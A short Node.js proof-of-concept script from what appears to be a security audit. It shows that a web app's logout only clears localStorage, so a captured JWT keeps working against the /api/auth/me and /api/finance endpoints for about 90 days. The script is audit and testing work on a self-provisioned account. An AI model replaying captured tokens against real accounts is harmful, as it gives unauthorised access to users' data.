// §6 CRITICAL — Logout is client-only; tokens are never revoked and live 90 days.
// handleLogout (App.jsx) only does localStorage.removeItem — the server keeps no
// blacklist / token-version / SecurityStamp. A token captured once stays valid.
//
// This PoC: log in -> use token -> simulate "Вийти" (client discards it) -> the SAME
// token still works against the API. Also decodes exp to show the 90-day lifetime.
//
// Run: node 03-token-no-revocation.mjs
import { provision, api } from '../_lib/provision.mjs'

const line = (s = '') => process.stdout.write(s + '\n')

const u = await provision({ email: 'adv.t14.logout@gmail.com', nickname: 'Logout', gender: 'female' })
line(`[setup] logged in userId=${u.userId}`)

const before = await api('GET', '/api/auth/me', { token: u.token })
line(`[1] before logout  /api/auth/me -> ${before.status}`)

// --- user clicks "Вийти": App.jsx handleLogout only clears localStorage ---
line('[2] user clicks "Вийти" (client clears localStorage only; no server call)')

// Attacker (or anyone who copied the token) keeps using it:
const after = await api('GET', '/api/auth/me', { token: u.token })
line(`[3] AFTER logout   /api/auth/me -> ${after.status}  ${after.text}`)
const afterData = await api('GET', '/api/finance', { token: u.token })
line(`[3] AFTER logout   /api/finance -> ${afterData.status}`)

// Decode exp (server token has no iat; measure from now)
const payload = JSON.parse(Buffer.from(u.token.split('.')[1], 'base64url').toString())
const nowS = Math.floor(Date.now() / 1000)
const days = Math.round((payload.exp - nowS) / 86400)
line(`\n[4] token exp = ${new Date(payload.exp * 1000).toISOString()}  (~${days} days from now)`)

const confirmed = after.status === 200
line('\n==============================================================')
line(`VERDICT: ${confirmed ? 'CONFIRMED 🔴' : 'NOT reproduced'}`)
line(`  expected: a logged-out / revoked token is rejected (401)`)
line(`  observed: token still returns ${after.status} after logout; valid for ${days} days`)
line('  -> No server-side session invalidation; a leaked token = ~3 months of access.')
